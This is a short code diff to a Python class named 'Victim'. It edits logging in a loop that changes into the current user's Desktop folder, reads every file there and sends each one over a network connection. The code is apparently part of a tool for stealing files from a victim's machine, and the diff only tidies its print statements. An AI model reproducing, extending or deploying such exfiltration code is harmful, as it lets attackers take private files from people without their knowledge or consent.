@@ -22,12 +22,11 @@ class Victim(Protocol):
         if connected:
             os.chdir(f'/Users/{os.getlogin()}/Desktop')
             for file in os.listdir():
-                print(file, os.path.isfile(file))
                 if os.path.isfile(file):
-                    print(file)
                     with open(file, 'rb') as f:
                         data = f.read()
                     self.send_file(self.victim, file.encode(), data)
+                    print('----------------------------------------')
                     print('sending', file)
             connected = False
         self.victim.close()
